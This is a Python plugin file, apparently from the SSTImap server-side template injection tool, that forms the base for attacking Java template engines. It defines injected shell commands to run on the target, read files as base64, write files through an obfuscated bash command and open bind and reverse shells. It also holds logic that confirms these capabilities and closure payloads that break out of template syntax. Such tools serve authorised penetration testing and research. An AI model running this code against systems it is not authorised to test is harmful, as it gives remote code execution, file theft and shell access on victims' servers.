from core.plugin import Plugin
from core import bash
from utils import closures
from utils import rand
import re


class Java(Plugin):
    # Avoid int overflow
    header_length = 9
    header_type = "add"
    no_tests = True
    priority = 8
    plugin_info = {
        "Description": """Base for Java-based template engines. This plugin performs no tests""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap plugin
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
    }

    def language_init(self):
        self.update_actions({
            # Prepared to used only for blind detection. Not useful for time-boolean
            # tests (since && characters can't be used) but enough for the detection phase.
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            'execute': {
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2],
                'test_os': """uname""",
                'test_os_expected': r'^[\w-]+$'
            },
            'read': {
                'call': 'execute',
                'read': """base64<'{path}'"""
            },
            'write': {
                'call': 'execute',
                'write': """bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}""",
                'truncate': """bash -c {{echo,-n,}}>{path}""",
            },
            'md5': {
                'call': 'execute',
                'md5': """$(type -p md5 md5sum)<'{path}'|head -c 32"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            }
        })

    language = 'java'

    def rendered_detected(self):
        # Java has no eval() function, hence the checks are done using the command execution action.
        # Eval is checked later for template-specific evals
        error = self.get('error', False)
        action_execute = self.actions.get('execute', {}).copy()
        if error and 'execute_error' in self.actions:
            action_execute.update(self.actions.get('execute_error', {}))
        test_cmd_code = action_execute.get('test_cmd')
        test_cmd_code_expected = action_execute.get('test_cmd_expected')
        if test_cmd_code and test_cmd_code_expected and test_cmd_code_expected == self.execute(test_cmd_code).rstrip():
            self.set('execute', True)
            if self.actions.get('write'):
                self.set('write', True)
            if self.actions.get('read') or (error and self.actions.get('read_error')):
                self.set('read', True)
            if self.actions.get('bind_shell'):
                self.set('bind_shell', True)
            if self.actions.get('reverse_shell'):
                self.set('reverse_shell', True)
            test_os_code = action_execute.get('test_os')
            test_os_code_expected = action_execute.get('test_os_expected')
            if test_os_code and test_os_code_expected:
                os = self.execute(test_os_code)
                if os and re.search(test_os_code_expected, os):
                    self.set('os', os)
            action_evaluate = self.actions.get('evaluate', {}).copy()
            if error and 'evaluate_error' in self.actions:
                action_evaluate.update(self.actions.get('evaluate_error', {}))
            if action_evaluate:
                test_eval = action_evaluate.get('test_eval')
                test_eval_expected = action_evaluate.get('test_eval_expected')
                # Using rstrip in case of trailing newline
                if test_eval and test_eval_expected and test_eval_expected == self.evaluate(test_eval).rstrip():
                    self.set('evaluate', self.language)

    def blind_detected(self):
        # No blind code evaluation is possible in pure Java, only execution
        # Since execution has been used to detect blind injection, let's assume execute_blind as set.
        self.set('execute_blind', True)
        if self.actions.get('write'):
            self.set('write', True)
        if self.actions.get('bind_shell'):
            self.set('bind_shell', True)
        if self.actions.get('reverse_shell'):
            self.set('reverse_shell', True)
        test_cmd_code = self.actions.get('evaluate', {}).get('test_eval')
        if test_cmd_code and self.evaluate_blind(test_cmd_code):
            self.set('evaluate_blind', self.language)


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.true_var + closures.iterable_var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ]
}
